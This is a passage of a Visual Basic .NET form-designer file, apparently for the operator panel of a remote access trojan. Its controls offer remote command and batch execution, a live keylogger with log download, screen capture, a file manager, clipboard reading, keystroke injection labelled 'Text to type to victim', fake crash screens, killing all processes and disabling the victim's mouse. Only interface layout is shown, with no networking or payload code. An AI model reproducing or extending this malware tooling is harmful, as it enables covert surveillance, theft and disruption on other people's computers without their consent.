        Me.Button62.UseVisualStyleBackColor = True
        '
        'TextBox1
        '
        Me.TextBox1.Location = New System.Drawing.Point(35, 12)
        Me.TextBox1.Name = "TextBox1"
        Me.TextBox1.Size = New System.Drawing.Size(139, 20)
        Me.TextBox1.TabIndex = 0
        Me.TextBox1.Text = "127.0.0.1"
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Location = New System.Drawing.Point(13, 16)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(20, 13)
        Me.Label3.TabIndex = 2
        Me.Label3.Text = "IP:"
        '
        'GroupBox5
        '
        Me.GroupBox5.Controls.Add(Me.GroupBox12)
        Me.GroupBox5.Controls.Add(Me.Button35)
        Me.GroupBox5.Controls.Add(Me.GroupBox9)
        Me.GroupBox5.Controls.Add(Me.GroupBox7)
        Me.GroupBox5.Controls.Add(Me.Button37)
        Me.GroupBox5.Controls.Add(Me.Button13)
        Me.GroupBox5.Controls.Add(Me.GroupBox3)
        Me.GroupBox5.Location = New System.Drawing.Point(276, 43)
        Me.GroupBox5.Name = "GroupBox5"
        Me.GroupBox5.Size = New System.Drawing.Size(295, 254)
        Me.GroupBox5.TabIndex = 9
        Me.GroupBox5.TabStop = False
        Me.GroupBox5.Text = "Fun"
        '
        'GroupBox12
        '
        Me.GroupBox12.Controls.Add(Me.Label9)
        Me.GroupBox12.Controls.Add(Me.Label8)
        Me.GroupBox12.Controls.Add(Me.Button63)
        Me.GroupBox12.Controls.Add(Me.TextBox13)
        Me.GroupBox12.Controls.Add(Me.TextBox12)
        Me.GroupBox12.Location = New System.Drawing.Point(11, 55)
        Me.GroupBox12.Name = "GroupBox12"
        Me.GroupBox12.Size = New System.Drawing.Size(129, 81)
        Me.GroupBox12.TabIndex = 11
        Me.GroupBox12.TabStop = False
        Me.GroupBox12.Text = "Beep"
        '
        'Label9
        '
        Me.Label9.AutoSize = True
        Me.Label9.Location = New System.Drawing.Point(13, 39)
        Me.Label9.Name = "Label9"
        Me.Label9.Size = New System.Drawing.Size(30, 13)
        Me.Label9.TabIndex = 4
        Me.Label9.Text = "Time"
        '
        'Label8
        '
        Me.Label8.AutoSize = True
        Me.Label8.Location = New System.Drawing.Point(17, 16)
        Me.Label8.Name = "Label8"
        Me.Label8.Size = New System.Drawing.Size(22, 13)
        Me.Label8.TabIndex = 3
        Me.Label8.Text = "HZ"
        '
        'Button63
        '
        Me.Button63.Location = New System.Drawing.Point(56, 59)
        Me.Button63.Name = "Button63"
        Me.Button63.Size = New System.Drawing.Size(70, 19)
        Me.Button63.TabIndex = 2
        Me.Button63.Text = "BEEEP!!"
        Me.Button63.UseVisualStyleBackColor = True
        '
        'TextBox13
        '
        Me.TextBox13.Location = New System.Drawing.Point(52, 35)
        Me.TextBox13.Name = "TextBox13"
        Me.TextBox13.Size = New System.Drawing.Size(74, 20)
        Me.TextBox13.TabIndex = 1
        Me.TextBox13.Text = "500"
        '
        'TextBox12
        '
        Me.TextBox12.Location = New System.Drawing.Point(51, 10)
        Me.TextBox12.Name = "TextBox12"
        Me.TextBox12.Size = New System.Drawing.Size(74, 20)
        Me.TextBox12.TabIndex = 0
        Me.TextBox12.Text = "15000"
        '
        'Button35
        '
        Me.Button35.Location = New System.Drawing.Point(16, 142)
        Me.Button35.Name = "Button35"
        Me.Button35.Size = New System.Drawing.Size(126, 21)
        Me.Button35.TabIndex = 10
        Me.Button35.Text = "Execute remote batch"
        Me.Button35.UseVisualStyleBackColor = True
        '
        'GroupBox9
        '
        Me.GroupBox9.Controls.Add(Me.Button11)
        Me.GroupBox9.Controls.Add(Me.TextBox9)
        Me.GroupBox9.Location = New System.Drawing.Point(12, 10)
        Me.GroupBox9.Name = "GroupBox9"
        Me.GroupBox9.Size = New System.Drawing.Size(275, 49)
        Me.GroupBox9.TabIndex = 9
        Me.GroupBox9.TabStop = False
        Me.GroupBox9.Text = "Run commands"
        '
        'Button11
        '
        Me.Button11.Location = New System.Drawing.Point(202, 14)
        Me.Button11.Name = "Button11"
        Me.Button11.Size = New System.Drawing.Size(66, 30)
        Me.Button11.TabIndex = 1
        Me.Button11.Text = "CMD"
        Me.Button11.UseVisualStyleBackColor = True
        '
        'TextBox9
        '
        Me.TextBox9.Location = New System.Drawing.Point(12, 19)
        Me.TextBox9.Name = "TextBox9"
        Me.TextBox9.Size = New System.Drawing.Size(180, 20)
        Me.TextBox9.TabIndex = 0
        '
        'GroupBox7
        '
        Me.GroupBox7.Controls.Add(Me.Button70)
        Me.GroupBox7.Controls.Add(Me.Button53)
        Me.GroupBox7.Controls.Add(Me.Button52)
        Me.GroupBox7.Controls.Add(Me.Button51)
        Me.GroupBox7.Controls.Add(Me.Button50)
        Me.GroupBox7.Controls.Add(Me.Button49)
        Me.GroupBox7.Controls.Add(Me.Button48)
        Me.GroupBox7.Controls.Add(Me.Button47)
        Me.GroupBox7.Controls.Add(Me.Button46)
        Me.GroupBox7.Location = New System.Drawing.Point(151, 74)
        Me.GroupBox7.Name = "GroupBox7"
        Me.GroupBox7.Size = New System.Drawing.Size(142, 177)
        Me.GroupBox7.TabIndex = 8
        Me.GroupBox7.TabStop = False
        Me.GroupBox7.Text = "Screenfuka"
        '
        'Button70
        '
        Me.Button70.Location = New System.Drawing.Point(6, 110)
        Me.Button70.Name = "Button70"
        Me.Button70.Size = New System.Drawing.Size(130, 25)
        Me.Button70.TabIndex = 8
        Me.Button70.Text = "Fake Mac"
        Me.Button70.UseVisualStyleBackColor = True
        '
        'Button53
        '
        Me.Button53.Location = New System.Drawing.Point(5, 145)
        Me.Button53.Name = "Button53"
        Me.Button53.Size = New System.Drawing.Size(78, 25)
        Me.Button53.TabIndex = 7
        Me.Button53.Text = "Fake BSOD"
        Me.Button53.UseVisualStyleBackColor = True
        '
        'Button52
        '
        Me.Button52.Location = New System.Drawing.Point(6, 82)
        Me.Button52.Name = "Button52"
        Me.Button52.Size = New System.Drawing.Size(130, 25)
        Me.Button52.TabIndex = 6
        Me.Button52.Text = "Fake Ubuntu"
        Me.Button52.UseVisualStyleBackColor = True
        '
        'Button51
        '
        Me.Button51.Location = New System.Drawing.Point(84, 144)
        Me.Button51.Name = "Button51"
        Me.Button51.Size = New System.Drawing.Size(54, 25)
        Me.Button51.TabIndex = 5
        Me.Button51.Text = "Hide all"
        Me.Button51.UseVisualStyleBackColor = True
        '
        'Button50
        '
        Me.Button50.Location = New System.Drawing.Point(53, 51)
        Me.Button50.Name = "Button50"
        Me.Button50.Size = New System.Drawing.Size(85, 25)
        Me.Button50.TabIndex = 4
        Me.Button50.Text = "Pure Black"
        Me.Button50.UseVisualStyleBackColor = True
        '
        'Button49
        '
        Me.Button49.Location = New System.Drawing.Point(6, 51)
        Me.Button49.Name = "Button49"
        Me.Button49.Size = New System.Drawing.Size(46, 25)
        Me.Button49.TabIndex = 3
        Me.Button49.Text = "Black"
        Me.Button49.UseVisualStyleBackColor = True
        '
        'Button48
        '
        Me.Button48.Location = New System.Drawing.Point(96, 20)
        Me.Button48.Name = "Button48"
        Me.Button48.Size = New System.Drawing.Size(46, 25)
        Me.Button48.TabIndex = 2
        Me.Button48.Text = "Green"
        Me.Button48.UseVisualStyleBackColor = True
        '
        'Button47
        '
        Me.Button47.Location = New System.Drawing.Point(51, 20)
        Me.Button47.Name = "Button47"
        Me.Button47.Size = New System.Drawing.Size(46, 25)
        Me.Button47.TabIndex = 1
        Me.Button47.Text = "Blue"
        Me.Button47.UseVisualStyleBackColor = True
        '
        'Button46
        '
        Me.Button46.Location = New System.Drawing.Point(6, 20)
        Me.Button46.Name = "Button46"
        Me.Button46.Size = New System.Drawing.Size(46, 25)
        Me.Button46.TabIndex = 0
        Me.Button46.Text = "Red"
        Me.Button46.UseVisualStyleBackColor = True
        '
        'Button37
        '
        Me.Button37.Location = New System.Drawing.Point(15, 166)
        Me.Button37.Name = "Button37"
        Me.Button37.Size = New System.Drawing.Size(127, 20)
        Me.Button37.TabIndex = 0
        Me.Button37.Text = "Kill all processes"
        Me.Button37.UseVisualStyleBackColor = True
        '
        'Button13
        '
        Me.Button13.Enabled = False
        Me.Button13.Location = New System.Drawing.Point(16, 187)
        Me.Button13.Name = "Button13"
        Me.Button13.Size = New System.Drawing.Size(127, 19)
        Me.Button13.TabIndex = 0
        Me.Button13.Text = "Swap Mouse Button"
        Me.Button13.UseVisualStyleBackColor = True
        '
        'GroupBox3
        '
        Me.GroupBox3.Controls.Add(Me.Button8)
        Me.GroupBox3.Controls.Add(Me.Button7)
        Me.GroupBox3.Location = New System.Drawing.Point(6, 208)
        Me.GroupBox3.Name = "GroupBox3"
        Me.GroupBox3.Size = New System.Drawing.Size(136, 40)
        Me.GroupBox3.TabIndex = 7
        Me.GroupBox3.TabStop = False
        Me.GroupBox3.Text = "CD Drive"
        '
        'Button8
        '
        Me.Button8.Location = New System.Drawing.Point(71, 14)
        Me.Button8.Name = "Button8"
        Me.Button8.Size = New System.Drawing.Size(60, 22)
        Me.Button8.TabIndex = 1
        Me.Button8.Text = "Close"
        Me.Button8.UseVisualStyleBackColor = True
        '
        'Button7
        '
        Me.Button7.Location = New System.Drawing.Point(6, 14)
        Me.Button7.Name = "Button7"
        Me.Button7.Size = New System.Drawing.Size(62, 22)
        Me.Button7.TabIndex = 0
        Me.Button7.Text = "Open"
        Me.Button7.UseVisualStyleBackColor = True
        '
        'GroupBox4
        '
        Me.GroupBox4.Controls.Add(Me.Button10)
        Me.GroupBox4.Controls.Add(Me.Button9)
        Me.GroupBox4.Location = New System.Drawing.Point(152, 218)
        Me.GroupBox4.Name = "GroupBox4"
        Me.GroupBox4.Size = New System.Drawing.Size(118, 61)
        Me.GroupBox4.TabIndex = 8
        Me.GroupBox4.TabStop = False
        Me.GroupBox4.Text = "FUN!"
        '
        'Button10
        '
        Me.Button10.Enabled = False
        Me.Button10.Location = New System.Drawing.Point(10, 14)
        Me.Button10.Name = "Button10"
        Me.Button10.Size = New System.Drawing.Size(102, 22)
        Me.Button10.TabIndex = 2
        Me.Button10.Text = "Disable Mouse"
        Me.Button10.UseVisualStyleBackColor = True
        '
        'Button9
        '
        Me.Button9.Enabled = False
        Me.Button9.Location = New System.Drawing.Point(9, 39)
        Me.Button9.Name = "Button9"
        Me.Button9.Size = New System.Drawing.Size(102, 22)
        Me.Button9.TabIndex = 1
        Me.Button9.Text = "Enable Mouse"
        Me.Button9.UseVisualStyleBackColor = True
        '
        'GroupBox2
        '
        Me.GroupBox2.Controls.Add(Me.Button6)
        Me.GroupBox2.Controls.Add(Me.Button5)
        Me.GroupBox2.Controls.Add(Me.Button4)
        Me.GroupBox2.Controls.Add(Me.Button3)
        Me.GroupBox2.Location = New System.Drawing.Point(23, 155)
        Me.GroupBox2.Name = "GroupBox2"
        Me.GroupBox2.Size = New System.Drawing.Size(123, 128)
        Me.GroupBox2.TabIndex = 6
        Me.GroupBox2.TabStop = False
        Me.GroupBox2.Text = "System Power"
        '
        'Button6
        '
        Me.Button6.Location = New System.Drawing.Point(9, 100)
        Me.Button6.Name = "Button6"
        Me.Button6.Size = New System.Drawing.Size(102, 22)
        Me.Button6.TabIndex = 3
        Me.Button6.Text = "Hibernate"
        Me.Button6.UseVisualStyleBackColor = True
        '
        'Button5
        '
        Me.Button5.Location = New System.Drawing.Point(9, 72)
        Me.Button5.Name = "Button5"
        Me.Button5.Size = New System.Drawing.Size(102, 22)
        Me.Button5.TabIndex = 2
        Me.Button5.Text = "Restart"
        Me.Button5.UseVisualStyleBackColor = True
        '
        'Button4
        '
        Me.Button4.Location = New System.Drawing.Point(9, 44)
        Me.Button4.Name = "Button4"
        Me.Button4.Size = New System.Drawing.Size(102, 22)
        Me.Button4.TabIndex = 1
        Me.Button4.Text = "Logoff"
        Me.Button4.UseVisualStyleBackColor = True
        '
        'Button3
        '
        Me.Button3.Location = New System.Drawing.Point(9, 19)
        Me.Button3.Name = "Button3"
        Me.Button3.Size = New System.Drawing.Size(102, 22)
        Me.Button3.TabIndex = 0
        Me.Button3.Text = "Shutdown"
        Me.Button3.UseVisualStyleBackColor = True
        '
        'GroupBox1
        '
        Me.GroupBox1.Controls.Add(Me.Label7)
        Me.GroupBox1.Controls.Add(Me.TextBox11)
        Me.GroupBox1.Controls.Add(Me.txt)
        Me.GroupBox1.Controls.Add(Me.cs)
        Me.GroupBox1.Location = New System.Drawing.Point(23, 39)
        Me.GroupBox1.Name = "GroupBox1"
        Me.GroupBox1.Size = New System.Drawing.Size(247, 82)
        Me.GroupBox1.TabIndex = 5
        Me.GroupBox1.TabStop = False
        Me.GroupBox1.Text = "Message popup"
        '
        'Label7
        '
        Me.Label7.AutoSize = True
        Me.Label7.Location = New System.Drawing.Point(16, 37)
        Me.Label7.Name = "Label7"
        Me.Label7.Size = New System.Drawing.Size(65, 13)
        Me.Label7.TabIndex = 8
        Me.Label7.Text = "Window title"
        '
        'TextBox11
        '
        Me.TextBox11.Location = New System.Drawing.Point(19, 52)
        Me.TextBox11.Name = "TextBox11"
        Me.TextBox11.Size = New System.Drawing.Size(155, 20)
        Me.TextBox11.TabIndex = 7
        Me.TextBox11.Text = "Windows"
        '
        'TabPage2
        '
        Me.TabPage2.Controls.Add(Me.Button39)
        Me.TabPage2.Controls.Add(Me.Button16)
        Me.TabPage2.Controls.Add(Me.Button15)
        Me.TabPage2.Controls.Add(Me.TextBox3)
        Me.TabPage2.Controls.Add(Me.Button17)
        Me.TabPage2.Location = New System.Drawing.Point(4, 22)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage2.Size = New System.Drawing.Size(591, 303)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.Text = "Clipboard"
        Me.TabPage2.UseVisualStyleBackColor = True
        '
        'Button39
        '
        Me.Button39.Enabled = False
        Me.Button39.Location = New System.Drawing.Point(450, 6)
        Me.Button39.Name = "Button39"
        Me.Button39.Size = New System.Drawing.Size(113, 22)
        Me.Button39.TabIndex = 4
        Me.Button39.Text = "Clipboard info"
        Me.Button39.UseVisualStyleBackColor = True
        '
        'Button16
        '
        Me.Button16.Enabled = False
        Me.Button16.Location = New System.Drawing.Point(300, 6)
        Me.Button16.Name = "Button16"
        Me.Button16.Size = New System.Drawing.Size(141, 23)
        Me.Button16.TabIndex = 3
        Me.Button16.Text = "Write to Clipboard"
        Me.Button16.UseVisualStyleBackColor = True
        '
        'Button15
        '
        Me.Button15.Location = New System.Drawing.Point(153, 6)
        Me.Button15.Name = "Button15"
        Me.Button15.Size = New System.Drawing.Size(141, 23)
        Me.Button15.TabIndex = 2
        Me.Button15.Text = "Clear Clipboard"
        Me.Button15.UseVisualStyleBackColor = True
        '
        'TextBox3
        '
        Me.TextBox3.Location = New System.Drawing.Point(16, 54)
        Me.TextBox3.Multiline = True
        Me.TextBox3.Name = "TextBox3"
        Me.TextBox3.Size = New System.Drawing.Size(537, 235)
        Me.TextBox3.TabIndex = 1
        Me.TextBox3.Text = "Haxed!"
        '
        'Button17
        '
        Me.Button17.Location = New System.Drawing.Point(6, 6)
        Me.Button17.Name = "Button17"
        Me.Button17.Size = New System.Drawing.Size(141, 23)
        Me.Button17.TabIndex = 0
        Me.Button17.Text = "Get Clipboard"
        Me.Button17.UseVisualStyleBackColor = True
        '
        'TabPage3
        '
        Me.TabPage3.Controls.Add(Me.Label12)
        Me.TabPage3.Controls.Add(Me.GroupBox6)
        Me.TabPage3.Controls.Add(Me.Label4)
        Me.TabPage3.Controls.Add(Me.Button24)
        Me.TabPage3.Controls.Add(Me.TextBox4)
        Me.TabPage3.Location = New System.Drawing.Point(4, 22)
        Me.TabPage3.Name = "TabPage3"
        Me.TabPage3.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage3.Size = New System.Drawing.Size(591, 303)
        Me.TabPage3.TabIndex = 2
        Me.TabPage3.Text = "Send Keys"
        Me.TabPage3.UseVisualStyleBackColor = True
        '
        'Label12
        '
        Me.Label12.AutoSize = True
        Me.Label12.Font = New System.Drawing.Font("Microsoft Sans Serif", 11.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label12.Location = New System.Drawing.Point(-1, 30)
        Me.Label12.Name = "Label12"
        Me.Label12.Size = New System.Drawing.Size(562, 18)
        Me.Label12.TabIndex = 4
        Me.Label12.Text = "WARNING! THIS FEATURE WORKS, BUT WILL FREEZE THE PC AFTER"
        '
        'GroupBox6
        '
        Me.GroupBox6.Controls.Add(Me.TextBox5)
        Me.GroupBox6.Controls.Add(Me.Button32)
        Me.GroupBox6.Controls.Add(Me.Button31)
        Me.GroupBox6.Controls.Add(Me.Button30)
        Me.GroupBox6.Controls.Add(Me.Button29)
        Me.GroupBox6.Controls.Add(Me.Button28)
        Me.GroupBox6.Controls.Add(Me.Button27)
        Me.GroupBox6.Controls.Add(Me.Button26)
        Me.GroupBox6.Controls.Add(Me.Button23)
        Me.GroupBox6.Controls.Add(Me.Button22)
        Me.GroupBox6.Controls.Add(Me.Button21)
        Me.GroupBox6.Controls.Add(Me.Button20)
        Me.GroupBox6.Controls.Add(Me.Button19)
        Me.GroupBox6.Controls.Add(Me.Button18)
        Me.GroupBox6.Location = New System.Drawing.Point(25, 129)
        Me.GroupBox6.Name = "GroupBox6"
        Me.GroupBox6.Size = New System.Drawing.Size(524, 168)
        Me.GroupBox6.TabIndex = 3
        Me.GroupBox6.TabStop = False
        Me.GroupBox6.Text = "Special Keys"
        '
        'TextBox5
        '
        Me.TextBox5.Location = New System.Drawing.Point(165, 24)
        Me.TextBox5.Name = "TextBox5"
        Me.TextBox5.Size = New System.Drawing.Size(28, 20)
        Me.TextBox5.TabIndex = 15
        Me.TextBox5.Text = "4"
        '
        'Button32
        '
        Me.Button32.Location = New System.Drawing.Point(119, 19)
        Me.Button32.Name = "Button32"
        Me.Button32.Size = New System.Drawing.Size(38, 29)
        Me.Button32.TabIndex = 14
        Me.Button32.Text = "F"
        Me.Button32.UseVisualStyleBackColor = True
        '
        'Button31
        '
        Me.Button31.Location = New System.Drawing.Point(215, 62)
        Me.Button31.Name = "Button31"
        Me.Button31.Size = New System.Drawing.Size(55, 29)
        Me.Button31.TabIndex = 13
        Me.Button31.Text = "UP"
        Me.Button31.UseVisualStyleBackColor = True
        '
        'Button30
        '
        Me.Button30.Location = New System.Drawing.Point(215, 129)
        Me.Button30.Name = "Button30"
        Me.Button30.Size = New System.Drawing.Size(55, 29)
        Me.Button30.TabIndex = 12
        Me.Button30.Text = "Down"
        Me.Button30.UseVisualStyleBackColor = True
        '
        'Button29
        '
        Me.Button29.Location = New System.Drawing.Point(166, 97)
        Me.Button29.Name = "Button29"
        Me.Button29.Size = New System.Drawing.Size(49, 29)
        Me.Button29.TabIndex = 11
        Me.Button29.Text = "Left"
        Me.Button29.UseVisualStyleBackColor = True
        '
        'Button28
        '
        Me.Button28.Location = New System.Drawing.Point(267, 97)
        Me.Button28.Name = "Button28"
        Me.Button28.Size = New System.Drawing.Size(53, 29)
        Me.Button28.TabIndex = 10
        Me.Button28.Text = "Right"
        Me.Button28.UseVisualStyleBackColor = True
        '
        'Button27
        '
        Me.Button27.Location = New System.Drawing.Point(6, 89)
        Me.Button27.Name = "Button27"
        Me.Button27.Size = New System.Drawing.Size(85, 29)
        Me.Button27.TabIndex = 9
        Me.Button27.Text = "Caps Lock"
        Me.Button27.UseVisualStyleBackColor = True
        '
        'Button26
        '
        Me.Button26.Location = New System.Drawing.Point(6, 54)
        Me.Button26.Name = "Button26"
        Me.Button26.Size = New System.Drawing.Size(71, 29)
        Me.Button26.TabIndex = 8
        Me.Button26.Text = "Tab"
        Me.Button26.UseVisualStyleBackColor = True
        '
        'Button23
        '
        Me.Button23.Location = New System.Drawing.Point(422, 8)
        Me.Button23.Name = "Button23"
        Me.Button23.Size = New System.Drawing.Size(47, 29)
        Me.Button23.TabIndex = 5
        Me.Button23.Text = "Del"
        Me.Button23.UseVisualStyleBackColor = True
        '
        'Button22
        '
        Me.Button22.Location = New System.Drawing.Point(6, 19)
        Me.Button22.Name = "Button22"
        Me.Button22.Size = New System.Drawing.Size(39, 29)
        Me.Button22.TabIndex = 4
        Me.Button22.Text = "Esc"
        Me.Button22.UseVisualStyleBackColor = True
        '
        'Button21
        '
        Me.Button21.Location = New System.Drawing.Point(475, 8)
        Me.Button21.Name = "Button21"
        Me.Button21.Size = New System.Drawing.Size(32, 29)
        Me.Button21.TabIndex = 3
        Me.Button21.Text = "Ins"
        Me.Button21.UseVisualStyleBackColor = True
        '
        'Button20
        '
        Me.Button20.Location = New System.Drawing.Point(414, 129)
        Me.Button20.Name = "Button20"
        Me.Button20.Size = New System.Drawing.Size(55, 24)
        Me.Button20.TabIndex = 2
        Me.Button20.Text = "NumLK"
        Me.Button20.UseVisualStyleBackColor = True
        '
        'Button19
        '
        Me.Button19.Location = New System.Drawing.Point(383, 43)
        Me.Button19.Name = "Button19"
        Me.Button19.Size = New System.Drawing.Size(86, 29)
        Me.Button19.TabIndex = 1
        Me.Button19.Text = "BackSpace"
        Me.Button19.UseVisualStyleBackColor = True
        '
        'Button18
        '
        Me.Button18.Location = New System.Drawing.Point(398, 78)
        Me.Button18.Name = "Button18"
        Me.Button18.Size = New System.Drawing.Size(71, 45)
        Me.Button18.TabIndex = 0
        Me.Button18.Text = "Enter"
        Me.Button18.UseVisualStyleBackColor = True
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.Location = New System.Drawing.Point(58, 73)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(105, 13)
        Me.Label4.TabIndex = 2
        Me.Label4.Text = "Text to type to victim"
        '
        'Button24
        '
        Me.Button24.Location = New System.Drawing.Point(415, 86)
        Me.Button24.Name = "Button24"
        Me.Button24.Size = New System.Drawing.Size(116, 24)
        Me.Button24.TabIndex = 1
        Me.Button24.Text = "Send Keys"
        Me.Button24.UseVisualStyleBackColor = True
        '
        'TextBox4
        '
        Me.TextBox4.Location = New System.Drawing.Point(26, 89)
        Me.TextBox4.Name = "TextBox4"
        Me.TextBox4.Size = New System.Drawing.Size(383, 20)
        Me.TextBox4.TabIndex = 0
        Me.TextBox4.Text = "Herro?"
        '
        'TabPage4
        '
        Me.TabPage4.Controls.Add(Me.Button74)
        Me.TabPage4.Controls.Add(Me.Button41)
        Me.TabPage4.Controls.Add(Me.Button1)
        Me.TabPage4.Controls.Add(Me.Button34)
        Me.TabPage4.Controls.Add(Me.TextBox6)
        Me.TabPage4.Controls.Add(Me.Button25)
        Me.TabPage4.Controls.Add(Me.Button38)
        Me.TabPage4.Location = New System.Drawing.Point(4, 22)
        Me.TabPage4.Name = "TabPage4"
        Me.TabPage4.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage4.Size = New System.Drawing.Size(591, 303)
        Me.TabPage4.TabIndex = 3
        Me.TabPage4.Text = "Keylog"
        Me.TabPage4.UseVisualStyleBackColor = True
        '
        'Button74
        '
        Me.Button74.Enabled = False
        Me.Button74.Location = New System.Drawing.Point(244, 46)
        Me.Button74.Name = "Button74"
        Me.Button74.Size = New System.Drawing.Size(169, 28)
        Me.Button74.TabIndex = 6
        Me.Button74.Text = "Download logfile"
        Me.Button74.UseVisualStyleBackColor = True
        '
        'Button41
        '
        Me.Button41.Location = New System.Drawing.Point(445, 12)
        Me.Button41.Name = "Button41"
        Me.Button41.Size = New System.Drawing.Size(115, 28)
        Me.Button41.TabIndex = 5
        Me.Button41.Text = "Clear"
        Me.Button41.UseVisualStyleBackColor = True
        '
        'Button1
        '
        Me.Button1.Location = New System.Drawing.Point(116, 12)
        Me.Button1.Name = "Button1"
        Me.Button1.Size = New System.Drawing.Size(115, 28)
        Me.Button1.TabIndex = 4
        Me.Button1.Text = "Save"
        Me.Button1.UseVisualStyleBackColor = True
        '
        'Button34
        '
        Me.Button34.Location = New System.Drawing.Point(244, 12)
        Me.Button34.Name = "Button34"
        Me.Button34.Size = New System.Drawing.Size(169, 29)
        Me.Button34.TabIndex = 3
        Me.Button34.Text = "Connect for downloading log"
        Me.Button34.UseVisualStyleBackColor = True
        '
        'TextBox6
        '
        Me.TextBox6.Location = New System.Drawing.Point(14, 80)
        Me.TextBox6.Multiline = True
        Me.TextBox6.Name = "TextBox6"
        Me.TextBox6.ScrollBars = System.Windows.Forms.ScrollBars.Both
        Me.TextBox6.Size = New System.Drawing.Size(571, 209)
        Me.TextBox6.TabIndex = 2
        '
        'Button25
        '
        Me.Button25.Location = New System.Drawing.Point(14, 46)
        Me.Button25.Name = "Button25"
        Me.Button25.Size = New System.Drawing.Size(96, 28)
        Me.Button25.TabIndex = 1
        Me.Button25.Text = "Stop live Keylog"
        Me.Button25.UseVisualStyleBackColor = True
        '
        'Button38
        '
        Me.Button38.Location = New System.Drawing.Point(14, 11)
        Me.Button38.Name = "Button38"
        Me.Button38.Size = New System.Drawing.Size(96, 29)
        Me.Button38.TabIndex = 0
        Me.Button38.Text = "Start live Keylog"
        Me.Button38.UseVisualStyleBackColor = True
        '
        'TabPage5
        '
        Me.TabPage5.Controls.Add(Me.Label13)
        Me.TabPage5.Controls.Add(Me.Button61)
        Me.TabPage5.Controls.Add(Me.Button42)
        Me.TabPage5.Controls.Add(Me.Button14)
        Me.TabPage5.Controls.Add(Me.PictureBox1)
        Me.TabPage5.Location = New System.Drawing.Point(4, 22)
        Me.TabPage5.Name = "TabPage5"
        Me.TabPage5.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage5.Size = New System.Drawing.Size(591, 303)
        Me.TabPage5.TabIndex = 4
        Me.TabPage5.Text = "ScreenGrab"
        Me.TabPage5.UseVisualStyleBackColor = True
        '
        'Label13
        '
        Me.Label13.AutoSize = True
        Me.Label13.Location = New System.Drawing.Point(456, 7)
        Me.Label13.Name = "Label13"
        Me.Label13.Size = New System.Drawing.Size(79, 13)
        Me.Label13.TabIndex = 4
        Me.Label13.Text = "(BE PATIENT!)"
        '
        'Button61
        '
        Me.Button61.Enabled = False
        Me.Button61.Location = New System.Drawing.Point(150, 1)
        Me.Button61.Name = "Button61"
        Me.Button61.Size = New System.Drawing.Size(148, 21)
        Me.Button61.TabIndex = 3
        Me.Button61.Text = "Show"
        Me.Button61.UseVisualStyleBackColor = True
        '
        'Button42
        '
        Me.Button42.Enabled = False
        Me.Button42.Location = New System.Drawing.Point(303, 0)
        Me.Button42.Name = "Button42"
        Me.Button42.Size = New System.Drawing.Size(139, 22)
        Me.Button42.TabIndex = 2
        Me.Button42.Text = "Larger"
        Me.Button42.UseVisualStyleBackColor = True
        '
        'Button14
        '
        Me.Button14.Location = New System.Drawing.Point(4, 0)
        Me.Button14.Name = "Button14"
        Me.Button14.Size = New System.Drawing.Size(139, 22)
        Me.Button14.TabIndex = 1
        Me.Button14.Text = "Connect"
        Me.Button14.UseVisualStyleBackColor = True
        '
        'PictureBox1
        '
        Me.PictureBox1.Location = New System.Drawing.Point(5, 23)
        Me.PictureBox1.Name = "PictureBox1"
        Me.PictureBox1.Size = New System.Drawing.Size(580, 279)
        Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.PictureBox1.TabIndex = 0
        Me.PictureBox1.TabStop = False
        '
        'TabPage6
        '
        Me.TabPage6.Controls.Add(Me.Button33)
        Me.TabPage6.Controls.Add(Me.TextBox2)
        Me.TabPage6.Controls.Add(Me.Button40)
        Me.TabPage6.Location = New System.Drawing.Point(4, 22)
        Me.TabPage6.Name = "TabPage6"
        Me.TabPage6.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage6.Size = New System.Drawing.Size(591, 303)
        Me.TabPage6.TabIndex = 5
        Me.TabPage6.Text = "Super info"
        Me.TabPage6.UseVisualStyleBackColor = True
        '
        'Button33
        '
        Me.Button33.Location = New System.Drawing.Point(124, 7)
        Me.Button33.Name = "Button33"
        Me.Button33.Size = New System.Drawing.Size(99, 20)
        Me.Button33.TabIndex = 2
        Me.Button33.Text = "Clear"
        Me.Button33.UseVisualStyleBackColor = True
        '
        'TextBox2
        '
        Me.TextBox2.Location = New System.Drawing.Point(8, 33)
        Me.TextBox2.Multiline = True
        Me.TextBox2.Name = "TextBox2"
        Me.TextBox2.ScrollBars = System.Windows.Forms.ScrollBars.Both
        Me.TextBox2.Size = New System.Drawing.Size(558, 269)
        Me.TextBox2.TabIndex = 1
        '
        'Button40
        '
        Me.Button40.Location = New System.Drawing.Point(6, 6)
        Me.Button40.Name = "Button40"
        Me.Button40.Size = New System.Drawing.Size(99, 20)
        Me.Button40.TabIndex = 0
        Me.Button40.Text = "Go!"
        Me.Button40.UseVisualStyleBackColor = True
        '
        'TabPage7
        '
        Me.TabPage7.Controls.Add(Me.GroupBox15)
        Me.TabPage7.Controls.Add(Me.Button71)
        Me.TabPage7.Controls.Add(Me.ListBox5)
        Me.TabPage7.Controls.Add(Me.ListBox4)
        Me.TabPage7.Controls.Add(Me.Button75)
        Me.TabPage7.Controls.Add(Me.TextBox14)
        Me.TabPage7.Controls.Add(Me.Button57)
        Me.TabPage7.Controls.Add(Me.Button56)
        Me.TabPage7.Controls.Add(Me.Button55)
        Me.TabPage7.Controls.Add(Me.Button54)
        Me.TabPage7.Controls.Add(Me.Button43)
        Me.TabPage7.Controls.Add(Me.Label5)
        Me.TabPage7.Controls.Add(Me.ListBox2)
        Me.TabPage7.Location = New System.Drawing.Point(4, 22)
        Me.TabPage7.Name = "TabPage7"
        Me.TabPage7.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage7.Size = New System.Drawing.Size(591, 303)
        Me.TabPage7.TabIndex = 6
        Me.TabPage7.Text = "File manager"
        Me.TabPage7.UseVisualStyleBackColor = True
        '
        'GroupBox15
        '
